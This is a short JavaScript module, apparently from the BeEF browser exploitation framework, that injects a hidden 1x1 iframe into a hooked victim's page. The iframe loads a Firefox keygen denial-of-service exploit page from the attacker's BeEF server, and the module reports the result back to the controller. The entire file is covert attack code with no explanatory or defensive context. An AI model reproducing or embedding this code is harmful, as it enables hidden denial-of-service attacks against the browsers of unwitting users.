function do_main(){
	var iframe = document.createElement('iframe');
	iframe.src = beef_url + 'modules/symmetric/xplt_firefox_dos/ffkeygendos.html';
	iframe.setAttribute("width", "1");
	iframe.setAttribute("height", "1");
	iframe.setAttribute("style", "visibility:hidden;");
	document.body.appendChild(iframe);

	return "Request Sent";
}

return_result(result_id, do_main());